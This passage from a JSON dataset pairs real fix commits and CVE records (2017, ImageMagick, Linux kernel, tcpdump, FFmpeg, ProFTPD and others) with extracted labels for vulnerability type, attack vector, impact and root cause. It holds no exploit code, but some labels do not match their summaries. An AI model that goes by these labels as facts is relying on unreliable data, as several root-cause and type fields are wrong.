attacker"},{"commit_id":"e04cf3e9524f50ca336253513d977224e083b816","cve_id":"CVE-2017-16546","cwe_id":"CWE-119","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/851","summary":"The ReadWPGImage function in coders\/wpg.c in ImageMagick 7.0.7-9 does not properly validate the colormap index in a WPG palette, which allows remote attackers to cause a denial of service (use of uninitialized data or invalid memory allocation) or possibly have unspecified other impact via a malformed WPG file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"buffer overflow","Attack Vector":"via a malformed wpg file","Impact":"cause a denial of service ( use of uninitialized data or invalid memory allocation ) or possibly have unspecified other impact","Root Cause":"does not properly validate the colormap index","Attack Type":"remote attacker"},{"commit_id":"bd998c2e0df0469707503023d50d46cf0b10c787","cve_id":"CVE-2017-16525","cwe_id":"CWE-416","commit_message":"USB: serial: console: fix use-after-free on disconnect\n\nA clean-up patch removing two redundant NULL-checks from the console\ndisconnect handler inadvertently also removed a third check. This could\nlead to the struct usb_serial being prematurely freed by the console\ncode when a driver accepts but does not register any ports for an\ninterface which also lacks endpoint descriptors.\n\nFixes: 0e517c93dc02 (\"USB: serial: console: clean up sanity checks\")\nCc: stable <stable@vger.kernel.org>     # 4.11\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nAcked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>","summary":"The usb_serial_console_disconnect function in drivers\/usb\/serial\/console.c in the Linux kernel before 4.13.8 allows local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via a crafted USB device, related to disconnection and failed setup.","commit_message_1":"serial : console : fix use-after-free on disconnect a clean-up patch removing two redundant null-checks from the console disconnect handler inadvertently also removed a third check","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted usb device","Impact":"cause a denial of service ( use - after - free and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"fbaf24bce7ea4211e4608b3ab6c1b45702cb243d","cve_id":"CVE-2017-16359","cwe_id":"CWE-476","commit_message":"Fix #8764 a 3rd time since 2nd time is UB and can be optimized away","summary":"In radare 2.0.1, a pointer wraparound vulnerability exists in store_versioninfo_gnu_verdef() in libr\/bin\/format\/elf\/elf.c.","commit_message_1":"fix # <number> a 3rd time since 2nd time is ub and can be optimized away","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a pointer wraparound vulnerability","Attack Type":"local attacker"},{"commit_id":"008ba2a13f2d04c947adc536d19debb8fe66f110","cve_id":"CVE-2017-15649","cwe_id":"CWE-362","commit_message":"packet: hold bind lock when rebinding to fanout hook\n\nPacket socket bind operations must hold the po->bind_lock. This keeps\npo->running consistent with whether the socket is actually on a ptype\nlist to receive packets.\n\nfanout_add unbinds a socket and its packet_rcv\/tpacket_rcv call, then\nbinds the fanout object to receive through packet_rcv_fanout.\n\nMake it hold the po->bind_lock when testing po->running and rebinding.\nElse, it can race with other rebind operations, such as that in\npacket_set_ring from packet_rcv to tpacket_rcv. Concurrent updates\ncan result in a socket being added to a fanout group twice, causing\nuse-after-free KASAN bug reports, among others.\n\nReported independently by both trinity and syzkaller.\nVerified that the syzkaller reproducer passes after this patch.\n\nFixes: dc99f600698d (\"packet: Add fanout support.\")\nReported-by: nixioaming <nixiaoming@huawei.com>\nSigned-off-by: Willem de Bruijn <willemb@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/packet\/af_packet.c in the Linux kernel before 4.13.6 allows local users to gain privileges via crafted system calls that trigger mishandling of packet_fanout data structures, because of a race condition (involving fanout_add and packet_do_bind) that leads to a use-after-free, a different vulnerability than CVE-2017-6346.","commit_message_1":"hold bind lock when rebinding to fanout hook packet socket bind operation must hold the po- > bind_lock","Vulnerability Type":"Race Condition","Attack Vector":"via crafted system calls that trigger mishandling of packet _ fanout data structures , because of a race condition ( involving fanout _ add and packet _ do _ bind ) that leads to a use - after - free , a different vulnerability than cve - 2017 - 6346","Impact":"gain privileges","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"26f5a4350f3ab5507bb8727051c87bb04660f333","cve_id":"CVE-2017-14500","cwe_id":"CWE-78","commit_message":"Work around shell code in podcast names (#598)","summary":"Improper Neutralization of Special Elements used in an OS Command in the podcast playback function of Podbeuter in Newsbeuter 0.3 through 2.9 allows remote attackers to perform user-assisted code execution by crafting an RSS item with a media enclosure (i.e., a podcast file) that includes shell metacharacters in its filename, related to pb_controller.cpp and queueloader.cpp, a different vulnerability than CVE-2017-12904.","commit_message_1":"work around shell code in podcast name ( # <number> )","Vulnerability Type":"command injection","Attack Vector":"By using a specially-crafted RSS item","Impact":"execute arbitrary code","Root Cause":"caused by improper Neutralization of Special Elements used","Attack Type":"remote attacker"},{"commit_id":"04a567494786d5bb50894fc8bb8fea0cf496bea8","cve_id":"CVE-2017-14174","cwe_id":"CWE-834","commit_message":"Slightly different fix for #714","summary":"In coders\/psd.c in ImageMagick 7.0.7-0 Q16, a DoS in ReadPSDLayersInternal() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted PSD file, which claims a large *length* field in the header but does not contain sufficient backing data, is provided, the loop over *length* would consume huge CPU resources, since there is no EOF check inside the loop.","commit_message_1":"slightly different fix for # <number>","Vulnerability Type":"Excessive Iteration","Attack Vector":"By persuading a victim to open a specially crafted file","Impact":"cause a denial of service","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"remote attacker"},{"commit_id":"31458a18788b0cf0b722acda9bb2f2fe13a3fb32","cve_id":"CVE-2017-14032","cwe_id":"CWE-287","commit_message":"Only return VERIFY_FAILED from a single point\n\nEverything else is a fatal error. Also improve documentation about that for\nthe vrfy callback.","summary":"ARM mbed TLS before 1.3.21 and 2.x before 2.1.9, if optional authentication is configured, allows remote attackers to bypass peer authentication via an X.509 certificate chain with many intermediates. NOTE: although mbed TLS was formerly known as PolarSSL, the releases shipped with the PolarSSL name are not affected.","commit_message_1":"only return verify_failed from a single point everything else is a fatal error","Vulnerability Type":"Improper Authentication","Attack Vector":"By using an X.509 certificate chain with many intermediates","Impact":"bypass security restrictions","Root Cause":"caused by a flaw when authenticating via optional authentication configuration","Attack Type":"remote attacker"},{"commit_id":"a1eefe986065846b6c69dbc09afd9fa1a02c4a3d","cve_id":"CVE-2017-13687","cwe_id":"CWE-125","commit_message":"CVE-2017-13687\/CHDLC: Improve bounds and length checks.\n\nPrevent a possible buffer overread in chdlc_print() and replace the\ncustom check in chdlc_if_print() with a standard check in chdlc_print()\nso that the latter certainly does not over-read even when reached via\njuniper_chdlc_print(). Add length checks.","summary":"The Cisco HDLC parser in tcpdump before 4.9.2 has a buffer over-read in print-chdlc.c:chdlc_print().","commit_message_1":"improve bound and length check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"29e5470e6ab84badbc31f4532bb7554a796d9d52","cve_id":"CVE-2017-13028","cwe_id":"CWE-125","commit_message":"CVE-2017-13028\/BOOTP: Add a bounds check before fetching data\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT\/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s), modified\nso the capture file won't cause 'tcpdump: pcap_loop: truncated dump file'","summary":"The BOOTP parser in tcpdump before 4.9.2 has a buffer over-read in print-bootp.c:bootp_print().","commit_message_1":"add a bound check before fetching data this fix a buffer over-read discovered by bhargava shastry , sect\/tu berlin","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"42073d54c53a496be40ae84152bbfe2c923ac7bc","cve_id":"CVE-2017-13004","cwe_id":"CWE-125","commit_message":"CVE-2017-13004\/Juniper: Add a bounds check.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"The Juniper protocols parser in tcpdump before 4.9.2 has a buffer over-read in print-juniper.c:juniper_parse_header().","commit_message_1":"add a bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"9be4e0b5938b705e7e36cfcb110a740c6ff0cb97","cve_id":"CVE-2017-13000","cwe_id":"CWE-125","commit_message":"CVE-2017-13000\/IEEE 802.15.4: Add more bounds checks.\n\nWhile we're at it, add a bunch of macros for the frame control field's\nsubfields, have the reserved frame types show the frame type value, use\nthe same code path for processing source and destination addresses\nregardless of whether -v was specified (just leave out the addresses in\nnon-verbose mode), and return the header length in all cases.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd tests using the capture files supplied by the reporter(s).","summary":"The IEEE 802.15.4 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_15_4.c:ieee802_15_4_if_print().","commit_message_1":"add more bound check","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"a7e5f58f402e6919ec444a57946bade7dfd6b184","cve_id":"CVE-2017-13000","cwe_id":"CWE-125","commit_message":"CVE-2017-13000\/IEEE 802.15.4: Fix bug introduced by previous fix.\n\nWe've already advanced the pointer past the PAN ID, if present; it now\npoints to the address, so don't add 2 to it.\n\nThis fixes a buffer over-read discovered by Forcepoint's security\nresearchers Otto Airamo & Antti Levom\u00e4ki.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The IEEE 802.15.4 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_15_4.c:ieee802_15_4_if_print().","commit_message_1":"fix bug introduced by previous fix","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"99798bd9a41bd3d03fdc1e949810a38967f20ed3","cve_id":"CVE-2017-12987","cwe_id":"CWE-125","commit_message":"CVE-2017-12987\/IEEE 802.11: Fix processing of TIM IE.\n\nThe arguments to memcpy() were completely wrong.\n\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nAdd a test using the capture file supplied by Brian 'geeknik' Carpenter.","summary":"The IEEE 802.11 parser in tcpdump before 4.9.2 has a buffer over-read in print-802_11.c:parse_elements().","commit_message_1":"fix processing of tim ie","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over-read","Attack Type":"remote attacker"},{"commit_id":"c6e0531b5def26ecf912e8de6ade86cbdaed3751","cve_id":"CVE-2017-12899","cwe_id":"CWE-125","commit_message":"CVE-2017-12899\/DECnet: Fix bounds checking.\n\nIf we're skipping over padding before the *real* flags, check whether\nthe real flags are in the captured data before fetching it.  This fixes\na buffer over-read discovered by Kamil Frankowicz.\n\nNote one place where we don't need to do bounds checking as it's already\nbeen done.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The DECnet parser in tcpdump before 4.9.2 has a buffer over-read in print-decnet.c:decnet_print().","commit_message_1":"fix bound checking","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"f76e7feb41a4327d2b0978449bbdafe98d4a3771","cve_id":"CVE-2017-12896","cwe_id":"CWE-125","commit_message":"CVE-2017-12896\/ISAKMP: Do bounds checks in isakmp_rfc3948_print().\n\nThis fixes a buffer over-read discovered by Kamil Frankowicz.\n\nAdd a test using the capture file supplied by the reporter(s).","summary":"The ISAKMP parser in tcpdump before 4.9.2 has a buffer over-read in print-isakmp.c:isakmp_rfc3948_print().","commit_message_1":"do bound check in isakmp_rfc3948_print ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"has a buffer over - read","Attack Type":"remote attacker"},{"commit_id":"53c4137bd924b954432c6c59da7572c4c5ffa901","cve_id":"CVE-2017-12843","cwe_id":"CWE-20","commit_message":"imapd: check for isadmin BEFORE parsing sync lines","summary":"Cyrus IMAP before 3.0.3 allows remote authenticated users to write to arbitrary files via a crafted (1) SYNCAPPLY, (2) SYNCGET or (3) SYNCRESTORE command.","commit_message_1":"imapd : check for isadmin before parsing sync line","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted syncapply , syncget or syncrestore command","Impact":"write to arbitrary files","Root Cause":"caused by improper validation of channel geometry","Attack Type":"remote attacker"},{"commit_id":"2b04e8f6bbb196cab4b232af0f8d48ff2c7a8058","cve_id":"CVE-2017-12190","cwe_id":"CWE-772","commit_message":"more bio_map_user_iov() leak fixes\n\nwe need to take care of failure exit as well - pages already\nin bio should be dropped by analogue of bio_unmap_pages(),\nsince their refcounts had been bumped only once per reference\nin bio.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The bio_map_user_iov and bio_unmap_user functions in block\/bio.c in the Linux kernel before 4.13.8 do unbalanced refcounting when a SCSI I\/O vector has small consecutive buffers belonging to the same page. The bio_add_pc_page function merges them into one, but the page reference is never dropped. This causes a memory leak and possible system lockup (exploitable against the host OS by a guest OS user, if a SCSI disk is passed through to a virtual machine) due to an out-of-memory condition.","commit_message_1":"more bio_map_user_iov ( ) leak fix we need to take care of failure exit a well - page already in bio should be dropped by analogue of bio_unmap_pages ( ) , since their refcounts had been bumped only once per reference in bio","Vulnerability Type":"memory leak","Attack Vector":"via a crafted file","Impact":"cause a denial of service","Root Cause":"caused by an out-of-memory condition","Attack Type":"local attacker"},{"commit_id":"83e0f8ffd7eeb7661b0ff83257da23d24ca7f078","cve_id":"CVE-2017-11523","cwe_id":"CWE-835","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/591","summary":"The ReadTXTImage function in coders\/txt.c in ImageMagick through 6.9.9-0 and 7.x through 7.0.6-1 allows remote attackers to cause a denial of service (infinite loop) via a crafted file, because the end-of-file condition is not considered.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Infinite Loop","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"a23325b2e583556eae88ed3f764e457786bf4df6","cve_id":"CVE-2017-11472","cwe_id":"CWE-755","commit_message":"Namespace: fix operand cache leak\n\nI found some ACPI operand cache leaks in ACPI early abort cases.\n\nBoot log of ACPI operand cache leak is as follows:\n>[    0.174332] ACPI: Added _OSI(Module Device)\n>[    0.175504] ACPI: Added _OSI(Processor Device)\n>[    0.176010] ACPI: Added _OSI(3.0 _SCP Extensions)\n>[    0.177032] ACPI: Added _OSI(Processor Aggregator Device)\n>[    0.178284] ACPI: SCI (IRQ16705) allocation failed\n>[    0.179352] ACPI Exception: AE_NOT_ACQUIRED, Unable to install\nSystem Control Interrupt handler (20160930\/evevent-131)\n>[    0.180008] ACPI: Unable to start the ACPI Interpreter\n>[    0.181125] ACPI Error: Could not remove SCI handler\n(20160930\/evmisc-281)\n>[    0.184068] kmem_cache_destroy Acpi-Operand: Slab cache still has\nobjects\n>[    0.185358] CPU: 0 PID: 1 Comm: swapper\/0 Not tainted 4.10.0-rc3 #2\n>[    0.186820] Hardware name: innotek GmbH VirtualBox\/VirtualBox, BIOS\nVirtualBox 12\/01\/2006\n>[    0.188000] Call Trace:\n>[    0.188000]  ? dump_stack+0x5c\/0x7d\n>[    0.188000]  ? kmem_cache_destroy+0x224\/0x230\n>[    0.188000]  ? acpi_sleep_proc_init+0x22\/0x22\n>[    0.188000]  ? acpi_os_delete_cache+0xa\/0xd\n>[    0.188000]  ? acpi_ut_delete_caches+0x3f\/0x7b\n>[    0.188000]  ? acpi_terminate+0x5\/0xf\n>[    0.188000]  ? acpi_init+0x288\/0x32e\n>[    0.188000]  ? __class_create+0x4c\/0x80\n>[    0.188000]  ? video_setup+0x7a\/0x7a\n>[    0.188000]  ? do_one_initcall+0x4e\/0x1b0\n>[    0.188000]  ? kernel_init_freeable+0x194\/0x21a\n>[    0.188000]  ? rest_init+0x80\/0x80\n>[    0.188000]  ? kernel_init+0xa\/0x100\n>[    0.188000]  ? ret_from_fork+0x25\/0x30\n\nWhen early abort is occurred due to invalid ACPI information, Linux kernel\nterminates ACPI by calling AcpiTerminate() function. The function calls\nAcpiNsTerminate() function to delete namespace data and ACPI operand cache\n(AcpiGbl_ModuleCodeList).\n\nBut the deletion code in AcpiNsTerminate() function is wrapped in\nACPI_EXEC_APP definition, therefore the code is only executed when the\ndefinition exists. If the define doesn't exist, ACPI operand cache\n(AcpiGbl_ModuleCodeList) is leaked, and stack dump is shown in kernel log.\n\nThis causes a security threat because the old kernel (<= 4.9) shows memory\nlocations of kernel functions in stack dump, therefore kernel ASLR can be\nneutralized.\n\nTo fix ACPI operand leak for enhancing security, I made a patch which\nremoves the ACPI_EXEC_APP define in AcpiNsTerminate() function for\nexecuting the deletion code unconditionally.\n\nSigned-off-by: Seunghun Han <kkamagui@gmail.com>\nSigned-off-by: Lv Zheng <lv.zheng@intel.com>","summary":"The acpi_ns_terminate() function in drivers\/acpi\/acpica\/nsutils.c in the Linux kernel before 4.12 does not flush the operand cache and causes a kernel stack dump, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism (in the kernel through 4.9) via a crafted ACPI table.","commit_message_1":"fix operand cache leak i found some acpi operand cache leak in acpi early abort case","Vulnerability Type":"Improper Handling of Exceptional Conditions","Attack Vector":"via a crafted acpi table","Impact":"obtain sensitive information","Root Cause":"does not flush the operand cache and causes a kernel stack dump","Attack Type":"local attacker"},{"commit_id":"a15bffd105ac28fd0dd9b596632dbf035238fda3","cve_id":"CVE-2017-11142","cwe_id":"CWE-400","commit_message":"Fix bug #73807","summary":"In PHP before 5.6.31, 7.x before 7.0.17, and 7.1.x before 7.1.3, remote attackers could cause a CPU consumption denial of service attack by injecting long form variables, related to main\/php_variables.c.","commit_message_1":"fix bug # <number>","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"by injecting long form variables , related to main \/ php _ variables . c","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"e1b60aad77c27ed5d4dfc11e5e6a05a38c70489d","cve_id":"CVE-2017-9996","cwe_id":"CWE-119","commit_message":"avcodec\/cdxl: Check format parameter\n\nFixes out of array access\nFixes: 1378\/clusterfuzz-testcase-minimized-5715088008806400\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The cdxl_decode_frame function in libavcodec\/cdxl.c in FFmpeg 2.8.x before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 does not exclude the CHUNKY format, which allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"avcodec\/cdxl : check format parameter","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service ( heap - based buffer over","Root Cause":"does not exclude the chunky format","Attack Type":"remote attacker"},{"commit_id":"2171dfae8c065878a2e130390eb78cf2947a5b69","cve_id":"CVE-2017-9995","cwe_id":"CWE-119","commit_message":"avcodec\/scpr: Fix multiple runtime error: index 256 out of bounds for type 'unsigned int [256]'\n\nFixes: 1519\/clusterfuzz-testcase-minimized-5286680976162816\n\nFound-by: continuous fuzzing process https:\/\/github.com\/google\/oss-fuzz\/tree\/master\/targets\/ffmpeg\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"libavcodec\/scpr.c in FFmpeg 3.3 before 3.3.1 does not properly validate height and width data, which allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"fix multiple runtime error : index <number> out of bound for type 'unsigned int [ <number> ] '","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file ","Impact":"cause a denial of service ( heap - based buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"does not properly validate height and width data","Attack Type":"remote attacker"},{"commit_id":"189ff4219644532bdfa7bab28dfedaee4d6d4021","cve_id":"CVE-2017-9993","cwe_id":"CWE-200","commit_message":"avformat\/hls: Check local file extensions\n\nThis reduces the attack surface of local file-system\ninformation leaking.\n\nIt prevents the existing exploit leading to an information leak. As\nwell as similar hypothetical attacks.\n\nLeaks of information from files and symlinks ending in common multimedia extensions\nare still possible. But files with sensitive information like private keys and passwords\ngenerally do not use common multimedia filename extensions.\nIt does not stop leaks via remote addresses in the LAN.\n\nThe existing exploit depends on a specific decoder as well.\nIt does appear though that the exploit should be possible with any decoder.\nThe problem is that as long as sensitive information gets into the decoder,\nthe output of the decoder becomes sensitive as well.\nThe only obvious solution is to prevent access to sensitive information. Or to\ndisable hls or possibly some of its feature. More complex solutions like\nchecking the path to limit access to only subdirectories of the hls path may\nwork as an alternative. But such solutions are fragile and tricky to implement\nportably and would not stop every possible attack nor would they work with all\nvalid hls files.\n\nDevelopers have expressed their dislike \/ objected to disabling hls by default as well\nas disabling hls with local files. There also where objections against restricting\nremote url file extensions. This here is a less robust but also lower\ninconvenience solution.\nIt can be applied stand alone or together with other solutions.\nlimiting the check to local files was suggested by nevcairiel\n\nThis recommits the security fix without the author name joke which was\noriginally requested by Nicolas.\n\nFound-by: Emil Lerner and Pavel Cheremushkin\nReported-by: Thierry Foucu <tfoucu@google.com>\n\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"FFmpeg before 2.8.12, 3.0.x and 3.1.x before 3.1.9, 3.2.x before 3.2.6, and 3.3.x before 3.3.2 does not properly restrict HTTP Live Streaming filename extensions and demuxer names, which allows attackers to read arbitrary files via crafted playlist data.","commit_message_1":"check local file extension this reduces the attack surface of local file-system information leaking","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via crafted playlist data","Impact":"read arbitrary files","Root Cause":"does not properly restrict http live streaming filename extensions and demuxer names ","Attack Type":"remote attacker"},{"commit_id":"611b35627488a8d0763e75c25ee0875c5b7987dd","cve_id":"CVE-2017-9608","cwe_id":"CWE-476","commit_message":"avcodec\/dnxhd_parser: Do not return invalid value from dnxhd_find_frame_end() on error\n\nFixes: Null pointer dereference\n\nFixes: CVE-2017-9608\nFound-by: Yihan Lian\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The dnxhd decoder in FFmpeg before 3.2.6, and 3.3.x before 3.3.3 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted mov file.","commit_message_1":"do not return invalid value from dnxhd_find_frame_end ( ) on error","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted mov file","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"0a709e2a10b8288a0cc383547924ecfe285cef89","cve_id":"CVE-2017-9608","cwe_id":"CWE-476","commit_message":"avcodec\/dnxhd_parser: Do not return invalid value from dnxhd_find_frame_end() on error\n\nFixes: Null pointer dereference\n\nFixes: CVE-2017-9608\nFound-by: Yihan Lian\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>\n(cherry picked from commit 611b35627488a8d0763e75c25ee0875c5b7987dd)\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The dnxhd decoder in FFmpeg before 3.2.6, and 3.3.x before 3.3.3 allows remote attackers to cause a denial of service (NULL pointer dereference) via a crafted mov file.","commit_message_1":"do not return invalid value from dnxhd_find_frame_end ( ) on error ( cherry picked from commit 611b35627488a8d0763e75c25ee0875c5b7987dd )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted mov file","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"e58f2880df608652aff7fd35c45b242467ec0e79","cve_id":"CVE-2017-9250","cwe_id":"CWE-476","commit_message":"Do not allocate memory for zero length strings. (#1844)\n\nFixes #1821.\n\nJerryScript-DCO-1.0-Signed-off-by: Zoltan Herczeg zherczeg.u-szeged@partner.samsung.com","summary":"The lexer_process_char_literal function in jerry-core\/parser\/js\/js-lexer.c in JerryScript 1.0 does not skip memory allocation for empty strings, which allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via malformed JavaScript source code, related to the jmem_heap_free_block function.","commit_message_1":"do not allocate memory for zero length string","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via malformed javascript source code , related to the jmem _ heap _ free _ block function","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"does not skip memory allocation for empty strings","Attack Type":"remote attacker"},{"commit_id":"f015fbdd95f76438cd86366467bb2b39870dd7c6","cve_id":"CVE-2017-9226","cwe_id":"CWE-787","commit_message":"fix #55 : Byte value expressed in octal must be smaller than 256","summary":"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A heap out-of-bounds write or read occurs in next_state_val() during regular expression compilation. Octal numbers larger than 0xff are not handled correctly in fetch_token() and fetch_token_in_cc(). A malformed regular expression containing an octal number in the form of '700' would produce an invalid code point value larger than 0xff in next_state_val(), resulting in an out-of-bounds write memory corruption.","commit_message_1":"byte value expressed in octal must be smaller than <number>","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using a specially-crafted regular expression","Impact":"overflow a buffer and execute arbitrary or cause the application to crash","Root Cause":"caused by improper bounds checking by next_state_val()","Attack Type":"remote attacker"},{"commit_id":"f961e3f2acae94b727380c0b74e2d3954d0edf79","cve_id":"CVE-2017-8797","cwe_id":"CWE-129","commit_message":"nfsd: encoders mustn't use unitialized values in error cases\n\nIn error cases, lgp->lg_layout_type may be out of bounds; so we\nshouldn't be using it until after the check of nfserr.\n\nThis was seen to crash nfsd threads when the server receives a LAYOUTGET\nrequest with a large layout type.\n\nGETDEVICEINFO has the same problem.\n\nReported-by: Ari Kauppi <Ari.Kauppi@synopsys.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nCc: stable@vger.kernel.org\nSigned-off-by: J. Bruce Fields <bfields@redhat.com>","summary":"The NFSv4 server in the Linux kernel before 4.11.3 does not properly validate the layout type when processing the NFSv4 pNFS GETDEVICEINFO or LAYOUTGET operand in a UDP packet from a remote attacker. This type value is uninitialized upon encountering certain error conditions. This value is used as an array index for dereferencing, which leads to an OOPS and eventually a DoS of knfsd and a soft-lockup of the whole system.","commit_message_1":"encoders must n't use unitialized value in error case in error case , lgp- > lg_layout_type may be out of bound ; so we should n't be using it until after the check of nfserr","Vulnerability Type":"Improper Validation of Array Index","Attack Vector":"By sending a specially crafted NFSv4 pNFS LAYOUTGET command using UDP","Impact":"cause a denial of service","Root Cause":"does not properly validate the layout type when processing the nfsv4 pnfs getdeviceinfo or layoutget operand","Attack Type":"remote attacker"},{"commit_id":"708e996c87c5fae77b104ccfeb8f6db784c32074","cve_id":"CVE-2017-7586","cwe_id":"CWE-119","commit_message":"src\/ : Move to a variable length header buffer\n\nPreviously, the `psf->header` buffer was a fixed length specified by\n`SF_HEADER_LEN` which was set to `12292`. This was problematic for\ntwo reasons; this value was un-necessarily large for the majority\nof files and too small for some others.\n\nNow the size of the header buffer starts at 256 bytes and grows as\nnecessary up to a maximum of 100k.","summary":"In libsndfile before 1.0.28, an error in the *header_read()* function (common.c) when handling ID3 tags can be exploited to cause a stack-based buffer overflow via a specially crafted FLAC file.","commit_message_1":"move to a variable length header buffer previously , the ` psf- > header ` buffer wa a fixed length specified by ` sf_header_len ` which wa set to ` <number> `","Vulnerability Type":"buffer overflow","Attack Vector":"via a specially crafted FLAC file","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by improper validation of ID3 tags","Attack Type":"remote attacker"},{"commit_id":"ecff21e0d0e84f35c299ef91d7fda088e516d4ed","cve_id":"CVE-2017-7418","cwe_id":"CWE-59","commit_message":"Backporting recursive handling of DefaultRoot path, when AllowChrootSymlinks\nis off, to 1.3.5 branch.","summary":"ProFTPD before 1.3.5e and 1.3.6 before 1.3.6rc5 controls whether the home directory of a user could contain a symbolic link through the AllowChrootSymlinks configuration option, but checks only the last path component when enforcing AllowChrootSymlinks. Attackers with local access could bypass the AllowChrootSymlinks control by replacing a path component (other than the last one) with a symbolic link. The threat model includes an attacker who is not granted full filesystem access by a hosting provider, but can reconfigure the home directory of an FTP user.","commit_message_1":"backporting recursive handling of defaultroot path , when allowchrootsymlinks is off , to <file>","Vulnerability Type":"Link Following","Attack Vector":"By replacing a path component with a symbolic link","Impact":"bypass security restrictions","Root Cause":"caused by a flaw","Attack Type":"attacker"},{"commit_id":"f59593e6ff730b832dbe8754916cb5c821db579f","cve_id":"CVE-2017-7418","cwe_id":"CWE-59","commit_message":"Merge pull request #444 from proftpd\/auth-symlinks-anywhere-in-chroot\n\nWalk the entire DefaultRoot path, checking for symlinks of any compon\u2026","summary":"ProFTPD before 1.3.5e and 1.3.6 before 1.3.6rc5 controls whether the home directory of a user could contain a symbolic link through the AllowChrootSymlinks configuration option, but checks only the last path component when enforcing AllowChrootSymlinks. Attackers with local access could bypass the AllowChrootSymlinks control by replacing a path component (other than the last one) with a symbolic link. The threat model 